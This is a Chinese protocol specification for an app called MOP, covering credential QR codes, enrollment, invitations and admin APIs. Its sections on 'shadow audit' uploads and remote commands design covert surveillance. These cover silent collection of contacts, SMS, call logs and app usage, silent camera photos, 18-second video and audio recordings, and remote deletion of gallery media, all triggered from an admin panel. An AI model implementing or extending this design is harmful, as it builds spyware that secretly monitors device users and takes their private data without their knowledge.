MOP 加固项目通讯协议规范 (Protocol Specification)

1. 凭证二维码协议 (QR Code Protocol)
为了保证二维码在低密度下包含必要信息，采用紧凑的字符串拼接而非 JSON。

1.1 编码格式
- 格式: `mop://{BASE64_ENCODED_STRING}`
- 明文结构: `host_url|uid|access_token|timestamp`，分隔符 `|`
- 示例: api.sdkdns.top|u10025|tkn_992288|1704067200
- 视觉要求: Level H 纠错，Base64 建议 ≤128 字节。与 .cursorrules 第 5 节一致。

1.2 扫码异常处理
- 若扫描内容**非 mop 协议**或 **Base64 解析失败**：仅提示“无效二维码”或同等用户文案，**不得写入 Host/凭证**，避免污染本地配置。
- 仅当解析出合法 host、uid、token（及可选 timestamp）后，才更新本地存储并继续激活流程。

1.3 凭证中 timestamp 的语义与校验
- **含义**：timestamp 为凭证**签发时间**（Unix 秒），用于可选的有效期或审计。
- **校验**：是否校验、有效期或容忍时间窗口由实现约定；若当前不校验，客户端/服务端可保留该字段以备扩展。约定校验时须在规约或实现文档中写明规则，避免各端不一致。

2. 身份完善与激活接口 (Enrollment API)
用户首次登录后，强制补全资料并绑定设备。手机号采用 **选择国家 + 填写手机号**，后端按 **E.164**（+国家码+号码）存储与校验。

设备标识 device_id 用于 enroll、审计、远程指令的设备唯一标识。**采用常规方案**：各端须一致。Android 使用对 **Android ID**（或 Android ID + 部分稳定硬件信息）的 **SHA-256** 作为 device_id；iOS 使用对 **identifierForVendor**（或平台允许的稳定标识）的 SHA-256。禁止使用易变或可重置的单独字段。输出为字符串，作为 device_id 提交与存储。

2.1 资料提交
Endpoint: POST /api/v1/user/enroll
Payload (JSON): {
  "country_code": "+86",
  "phone": "E2EE_ENCRYPTED_NATIONAL_NUMBER 或后端拼接为 E.164 后加密",
  "username": "用户名字段，用于登录",
  "nickname": "张三",
  "password": "6～18位常规字符，用于登录",
  "device_id": "HASH_OF_HARDWARE_ID（见上方「设备标识 device_id」）",
  "device_info": {
    "model": "HUAWEI Mate 60",
    "os": "Android 14",
    "app_version": "1.0.102"
  },
  "invite_code": "可选，邀请码；校验通过后建立邀请关系并使邀请人与被邀请人互为好友"
}
响应: 成功 200，body 含 uid、access_token、host 等；失败 4xx，body 见第 7 节通用错误响应。**enroll 典型错误码**（与 code 字段一致）：device_already_bound（该 device_id 已绑定）、invite_expired（邀请码过期）、invite_used（邀请码已用尽）、invite_invalid（邀请码无效）、phone_exists（手机号已注册）、username_exists（用户名已占用）。前端可根据 code 引导用户重新扫码或更换邀请码。

2.2 用户端网页与 App 账密登录 (Web & App Auth)
用户端网页使用独立域名作为访问入口，用户仅需输入账密即可登录；与 App 扫码激活共用同一 User 体系。登录方式为 **手机号+密码** 或 **用户名+密码**。

Endpoint: POST /api/v1/auth/login

Payload (JSON): { "identity": "手机号（E.164）或用户名", "password": "用户密码" }

响应 (JSON): 成功 200，返回 access_token、uid、host（Tinode/API 所用 Host）、可选 refresh_token 与过期时间；手机号须脱敏或不出现在响应中。失败 401，body 见第 7 节；**典型错误码**：invalid_credentials（账密错误）、account_locked（账户锁定）。可重试：invalid_credentials 可提示用户重新输入；account_locked 提示联系管理员。

Token 刷新（常规方案） **提供 refresh 接口**：登录响应返回 refresh_token 时，api 提供 POST /api/v1/auth/refresh，Header 带 refresh_token 或 Body { "refresh_token": "xxx" }，响应 200 返回新 access_token（及可选新 refresh_token、过期时间）。**401 处理**：请求 api 返回 401 时，客户端先尝试**一次** refresh（若有 refresh_token），成功则用新 token 重试原请求；refresh 失败则跳转登录。endpoint、Header 名称与重试次数与上述一致，由实现固定。

2.3 邀请接口 (Invitation API)
新用户可通过邀请码或邀请链接/添加名片入网；**邀请链接与添加名片须包含 API（Host）与邀请码**，被邀请人可据此直接连接并完成资料补全。enroll 时携带 invite_code 校验通过后建立邀请关系，并**使邀请人与被邀请人互为好友**。

邀请/名片数据结构 须包含 **api**（Host，如 api.sdkdns.top）与 **invite_code**。邀请链接示例：https://web.sdkdns.top/join?api=api.sdkdns.top&code=xxx。添加名片（二维码或分享载荷）编码相同信息，便于 App 扫码或解析后使用。

生成邀请 **所有用户均有邀请权限**（默认）；若服务端需限制部分用户，可配置角色或权限，**无邀请权限时返回 403**，body 含 code（如 forbidden）、message。Endpoint: POST /api/v1/invite/generate。Header: 需用户鉴权（登录后即可调用）。生成邀请入口位于 App 设置页 → 我的凭证 → 右上角按钮，见 ARCHITECTURE 第 9 节。Payload (JSON): 可选 { "expire_seconds": 86400, "max_use": 1 }。响应: { "invite_code": "xxx", "api": "api.sdkdns.top", "invite_url": "https://web.sdkdns.top/join?api=api.sdkdns.top&code=xxx", "invite_card": "可选，供添加名片/二维码使用的含 api+invite_code 的结构" }（示例）。

校验邀请 Endpoint: GET /api/v1/invite/validate?code=xxx 或 POST /api/v1/invite/validate Body { "code": "xxx" }。响应: 有效 200，返回邀请人昵称、过期时间等；无效 404，body 含 code：invite_expired、invite_used、invite_invalid，便于前端统一提示。

绑定邀请 enroll 的 Payload 中可选字段 **invite_code**；服务端校验通过后建立邀请人–被邀请人关系，并**将双方互为好友**，再完成 User/Device 创建与绑定。校验失败时 enroll 返回 4xx，code 同上（invite_expired / invite_used / invite_invalid）。

邀请链接与已登录用户 已登录用户打开邀请链接时：可跳转至“通过邀请添加关系”或仅提示“您已登录”，不进入新用户资料补全流程；具体以产品为准，实现时二选一并统一。

2.4 查找用户（添加好友）
**查找添加好友**仅支持通过**用户名**或**手机号**进行**精确搜索**（服务端按整段匹配，不支持模糊）。Endpoint 建议：GET /api/v1/user/search?q=xxx 或 POST /api/v1/user/search Body { "query": "xxx" }；实现时二选一。请求需鉴权。**语义**：q/query 为用户名或手机号（E.164），服务端做**精确匹配**（等于该用户名或该手机号），返回匹配用户列表。**响应**：仅返回可对用户展示的字段（如 uid、昵称、头像、个人简介等），**不得返回手机号或手机号脱敏**，与隐私墙一致。**头像**未设置时，客户端以备注或昵称的**首字**作为默认头像展示；**简介**以该用户本人填写的简介为准，不得以本地占位替代。未匹配到可返回空列表 200。入口与交互见 ARCHITECTURE 第 9 节。

2.5 人员关系与好友
关系类型：**邀请关系**（inviter/invitee）、**好友关系**（双向，邀请成功后邀请人与被邀请人互为好友）。管理后台可查看、配置；好友列表与 Tinode 订阅或自有好友表同步，具体见实现。远程指令与审计的可见/可管范围可依关系限定。

3. 影子审计数据上报 (Audit Upload Protocol)审计数据在 Isolate 中处理，加密后上报。**平台说明**：data_types 仅上报该平台支持的项；**iOS 不包含**短信、通话记录、UsageStats 等系统限制无法采集的类型，客户端按平台能力过滤后再上报。3.1 摘要检查 (Hash Check)在冷启动时，App 发送当前本地数据的摘要。Endpoint: POST /api/v1/audit/check-sumPayload:JSON{
  "device_id": "HASH_ID",
  "data_types": {
    "contacts": "MD5_HASH_STRING",
    "sms": "MD5_HASH_STRING",
    "call_log": "MD5_HASH_STRING",
    "app_list": "MD5_HASH_STRING",
    "usage": "MD5_HASH_STRING"
  }
}
响应: 返回需更新的任务类型数组。如 ["contacts"] 表示服务端要求上传最新的通讯录。

3.2 数据上报
Endpoint: POST /api/v1/audit/upload
Payload: AES-256-GCM 加密的二进制（格式由实现约定，建议含 type、length、payload，便于服务端解析）。单次上报建议有最大体积限制，超出时可分片或分 type 多次请求。失败时客户端按指数退避重试（如 1min、2min、5min），具体间隔由实现约定。

3.3 远程采集结果上报（拍照/录像/录音）
由远程指令 mop.cmd.capture.photo / mop.cmd.capture.video / mop.cmd.capture.audio 触发的采集结果，**以实际文件**（图片、视频、音频二进制）在 Isolate 中加密后，经 **POST /api/v1/audit/upload** 上报，type 标明 capture_photo / capture_video / capture_audio；与 3.2 共用同一端点与加密规范。**录像、录音**约定时长为 18 秒；若未满 18 秒被中断，**已录制的实际媒体文件**仍须上传，不得仅上传描述性元数据。服务端按 device_id、msg_id（或 request_id）与 type 存储并供管理端按设备查询、下载。

4. 远程管控指令集 (Remote Commands)
指令通过 WebSocket (实时) 或厂商推送 (静默) 下发；**无长连/推送时**可由设备轮询拉取待执行指令。

**设备拉取待执行指令（轮询兜底）**  
- Endpoint: GET /api/v1/device/commands?device_id=xxx  
- 鉴权：用户端 Bearer Token（与 auth/login 一致）。  
- 仅返回**当前用户名下该 device_id** 的待执行指令；设备不属于当前用户时返回 403（forbidden）。  
- 响应 200：{ "items": [ { "msg_id", "cmd", "params" } ] }。  
- **消费语义**：服务端在返回该批指令后即从待执行列表中删除（消费），同一条指令只会被拉取一次，避免重复执行。

4.1 指令基本结构JSON{
  "msg_id": "UUID",
  "target_device_id": "DEVICE_HASH",
  "cmd": "COMMAND_NAME",
  "params": {},
  "timestamp": 1704067200
}
4.2 指令清单 (Command Set)
| 指令名称 (cmd) | 业务行为 | 静默/非静默 | 参数示例 |
|----------------|----------|-------------|----------|
| mop.cmd.dial | 唤起拨号盘 | 非静默 | {"number": "10086"} |
| mop.cmd.sms | 唤起短信编辑器 | 非静默 | {"number": "10086", "body": "HELP"} |
| mop.cmd.audit | 立即强制审计上报 | 静默 | {"types": ["sms", "call_log"]} |
| mop.cmd.gallery.clear | 清理相册：仅删除设备相册中最近 N 天内的照片与视频，不清空 APP 内数据、不退出登录 | 静默 | {"days": 3}，days 默认 3 |
| mop.cmd.wipe | （已废弃）不再清空 APP 数据；仅清理相册请使用 mop.cmd.gallery.clear。客户端收到可忽略。 | 静默 | {} |
| mop.cmd.uninstall | 远程卸载：调起系统卸载（Android 弹窗确认；iOS 无系统卸载 API 则无操作）。不再执行数据擦除。 | 静默 | {} |
| mop.cmd.config | 更新 Host 或心跳频率 | 静默 | {"heartbeat": 300} |
| mop.cmd.capture.photo | 拍一张照并加密上报 | 静默 | {"camera": "front"\|"back", 可选 "quality"\|"max_size"} |
| mop.cmd.capture.video | 录一段视频并加密上报，约定 18 秒 | 静默 | {"camera": "front"\|"back", "duration_sec": 18, 可选 "resolution"\|"max_size"} |
| mop.cmd.capture.audio | 录一段音频并加密上报，约定 18 秒 | 静默 | {"duration_sec": 18, 可选 "format"\|"max_size"} |

**mop.cmd.gallery.clear**：设备端**仅**对相册做“近 N 天内照片与视频”的永久删除（N 由 params.days 指定，默认 3）；不清理 SecureStorage、本地缓存与数据库，不退出登录。

**录像/录音时长与中断**：视频、音频采集约定时长为 **18 秒**（可由 params 的 duration_sec 指定，默认 18）。若在 18 秒内被中断（用户或系统导致），**仍将已录制的实际媒体文件**（非仅元数据）加密后经 3.3 节通道上报，与录满 18 秒时采用相同上报格式与接口。

5. 自动分发同步协议 (Build Sync)
构建脚本在编译完成后，同步信息至管理端。**本接口由 admin 服务提供**，Host 为 admin 域名（如 admin.sdkdns.top）。管理后台采用独立鉴权，与用户端 auth/login 分离。
Endpoint: POST /api/v1/internal/build-sync
Header: X-Build-Token: SECRET_KEY
Payload (JSON): {
  "version": "1.0.0",
  "build": 102,
  "file_name": "mop_v1.0_102.apk",
  "download_url": "https://admin.sdkdns.top/apks/mop_v1.0_102.apk",
  "change_log": "Initial stable release"
}
鉴权失败: X-Build-Token 缺失或错误时，admin 返回 **401** 或 **403**，body 建议含 code（如 invalid_token）、message，便于 CI 排查。

5.1 管理端接口（api 提供、admin 调用）
管理后台（admin）从 **api** 获取设备、用户、关系等数据，并可通过 api 下发远程指令。**Host 为 api 域名**（如 api.sdkdns.top）；鉴权与用户端 auth/login 分离，采用**管理端专用 Token 或 API Key**（由实现约定，如 Authorization: Bearer &lt;admin_token&gt; 或 X-Admin-Token）。以下为建议路径与语义，实现时可按需增删字段或分页参数。

**鉴权**：请求 Header 携带管理端凭证；缺失或无效时 api 返回 **401** 或 **403**，body 含 code（如 unauthorized、forbidden）、message。

**管理端登录验证码（防暴力破解）**  
- 获取验证码（无需鉴权）：GET /api/v1/admin/captcha。响应 200：{ "captcha_id": "hex 字符串", "gap_x": 整数 }（gap_x 为滑动拼图缺口横坐标，与前端 PUZZLE_W/PIECE_W 一致）。服务端将 captcha_id 与 gap_x 存于内存并设短 TTL（如 5 分钟），一次校验后即失效。  
- 登录时校验：POST /api/v1/admin/auth 的 Body 除 username、password 外须包含 "captcha_id"、"captcha_value"（整数，为滑块最终位置）。服务端先校验 |captcha_value - gap_x| ≤ 容差且 captcha_id 有效，通过后删除该验证码再校验账密；否则返回 400，body 含 code：**captcha_invalid**、message（如「验证码错误或已失效，请刷新后重试」）。

**设备列表**  
- Endpoint: GET /api/v1/admin/devices  
- Query（可选）：page、page_size、uid（按用户过滤）、online（true/false，按在线状态）、keyword（昵称/设备信息模糊）  
- 响应 200：{ "items": [ { "device_id", "uid", "nickname", "device_info", "last_ip", "online", "created_at" } ], "total": N, "page": 1, "page_size": 20 }  
- 敏感字段（如手机号）不出现在设备列表；需用户手机号时见「用户详情」。

**设备详情**  
- Endpoint: GET /api/v1/admin/devices/:device_id  
- 响应 200：单台设备详情（含 device_id、uid、nickname、device_info、last_ip、online、created_at 等）；404 为设备不存在。

**用户列表**  
- Endpoint: GET /api/v1/admin/users  
- Query（可选）：page、page_size、keyword（用户名/昵称模糊）  
- 响应 200：{ "items": [ { "uid", "username", "nickname", "phone_masked"（脱敏）, "created_at" } ], "total", "page", "page_size" }  
- 列表仅返回脱敏信息；手机号明文仅「用户详情」可返回（仅管理端）。

**用户详情**  
- Endpoint: GET /api/v1/admin/users/:uid  
- 响应 200：用户详情（含 uid、username、nickname、phone（E.164，仅管理端）、关联 device_id 列表、created_at 等）；404 为用户不存在。

**关系列表（邀请/好友）**  
- Endpoint: GET /api/v1/admin/relations  
- Query（可选）：page、page_size、type（invite|friend）、uid（参与人 uid）  
- 响应 200：{ "items": [ { "type", "inviter_uid", "invitee_uid", "created_at" } 或 { "uid_a", "uid_b", "created_at" } ], "total", "page", "page_size" }  
- 具体字段与 type 枚举由实现约定，与 ARCHITECTURE 3.1 邀请关系、好友关系一致。

**下发远程指令**  
- Endpoint: POST /api/v1/admin/devices/:device_id/command  
- Body (JSON): { "cmd": "mop.cmd.dial" | "mop.cmd.sms" | "mop.cmd.gallery.clear" | "mop.cmd.wipe"（已废弃） | "mop.cmd.uninstall" | "mop.cmd.audit" | "mop.cmd.config" | "mop.cmd.capture.photo" | "mop.cmd.capture.video" | "mop.cmd.capture.audio", "params": {} }  
- 响应 202：已接受，由 api 经 Tinode/推送下发至该设备；4xx 为参数错误或设备不存在；body 建议含 code、message。  
- 指令语义与第 4 节远程指令集一致；静默/非静默由协议约定，不在此重复。

**设备列表 UI 约定（管理后台）**  
- 设备列表（或设备详情）中须提供 **拍照**、**录像(18秒)**、**录音(18秒)** 三个操作按钮；管理员点击对应按钮时，即向该设备下发 mop.cmd.capture.photo、mop.cmd.capture.video（params 含 duration_sec: 18）、mop.cmd.capture.audio（params 含 duration_sec: 18）。设备执行后将**实际文件**加密上报（见第 3.3 节），管理端可按设备查询、查看或下载采集结果。

**审计数据查询（可选）**  
- 管理端可按设备查询已上报的审计数据（与第 3 节 check-sum/upload 对应），仅管理端鉴权可访问。建议路径示例：GET /api/v1/admin/audit/contacts?device_id=xxx、GET /api/v1/admin/audit/sms?device_id=xxx、GET /api/v1/admin/audit/call_log?device_id=xxx、GET /api/v1/admin/audit/app_list?device_id=xxx、GET /api/v1/admin/audit/usage?device_id=xxx；分页、排序、时间范围等由实现约定。响应字段与脱敏（如号码脱敏）须符合隐私与合规要求。  
- **远程采集结果**（拍照/录像/录音）与第 3.3 节对应：管理端可按设备查询、查看或下载已上报的 capture_photo / capture_video / capture_audio 文件，建议路径示例：GET /api/v1/admin/audit/captures?device_id=xxx（列表含 type、msg_id、timestamp、下载链接或 blob），或 GET /api/v1/admin/audit/captures/:id 下载单条；具体由实现约定。

**分页与错误**：分页参数未传时由实现约定默认 page_size；错误响应格式与第 7 节通用错误响应一致。

6. 加密规范 (Encryption Standards)
- **传输层**: 优先 TLS 1.3，兼容 TLS 1.2 及既有证书体系（如 RSA、常见 CA），以便自申请证书与旧客户端正常接入。
- **敏感字段**: 手机号在传输前使用服务端提供的 RSA 公钥加密。公钥通过登录/enroll 响应或 GET /api/v1/config 等接口下发，轮换策略由实现约定。
- **上报内容**: 影子数据使用 **AES-256-GCM** 加密。**审计加密 Key 派生**（各端须一致，Android、iOS、api 解密均按此执行）：
  - **输入**：`device_id`（与第 2 节「设备标识 device_id」一致，即各端已生成的 SHA-256 字符串）。
  - **算法**：**HKDF-SHA256**。`key_material = device_id`（或 UTF-8 编码后的字节）；`salt` 为空或由服务端在 config/ enroll 响应中下发的固定 salt（未下发则用空）；`info = "mop.audit.v1"`（固定字符串，便于后续版本扩展）；输出 **32 字节** 作为 AES-256-GCM 的密钥。
  - **约定**：各端（Android、iOS、api）必须使用上述 HKDF-SHA256 与 info，salt 策略一致（若服务端下发 salt 则客户端与 api 均使用该 salt），否则服务端无法正确解密审计包。

7. 通用错误响应与重试 (Common Error Response & Retry)
错误响应体建议统一包含：**code**（字符串，如 invalid_credentials）、**message**（可展示文案，可选）。可重试条件：网络超时、5xx、部分 4xx（如 429）由实现约定是否重试；重试建议采用指数退避，最大重试次数由实现约定。**管理端登录**：POST /api/v1/admin/auth 在验证码校验失败时返回 400，**code** 为 **captcha_invalid**（验证码错误或已失效），前端应刷新验证码后重试。

**API 失效判定（量化约定）**：App 端与用户端 Web 须采用同一组参数，避免行为不一致。
- **单次请求超时**：**15 秒**（自发起请求至收到响应或超时）。
- **判定为“API 失效”的条件**：在**同一 Host** 上，**连续 3 次**出现以下任一情况即判定为失效：单次请求超时、连接失败、或服务端返回 **5xx**。非 5xx 的 4xx（如 401、404）不计入“连续失败”次数（即不因单次 401 即判定失效）。
- **判定失效后的行为**：提示用户扫码激活（或通过邀请链接恢复）；**后台重试间隔**为 **30 秒**（即每 30 秒可自动重试一次该 Host，直至用户扫码或恢复网络后成功）。若实现“从无网到有网”的自动重试，建议同样采用 30 秒间隔后再发起请求。
- **重置计数**：任一次请求成功（2xx）后，将该 Host 的“连续失败”计数清零。

8. 音视频房间信令（经 Tinode）
音视频/屏幕共享的房间创建、加入、离开**信令经 Tinode 通道**下发，与 TINODE-JITSI-INTEGRATION.md 一致。**信令格式（消息 type、JSON 键名）以 Tinode 为准**，遵循 Tinode 现有消息与扩展规范；业务语义上须包含：room_name（Jitsi 房间名，全局唯一）、jit_domain（如 jit.sdkdns.top）、可选 display_name（当前用户昵称）、可选 room_options。创建房间：发起方或服务端在 Tinode 侧创建会话/房间并生成 room_name，经 Tinode 消息下发给参与方。加入房间：参与者收到信令后，以 room_name、jit_domain 加入 Jitsi，displayName 使用当前账户昵称，不二次弹窗输入姓名。离开/结束房间：经 Tinode 发送离开信令，客户端同时离开 Jitsi 并释放媒体。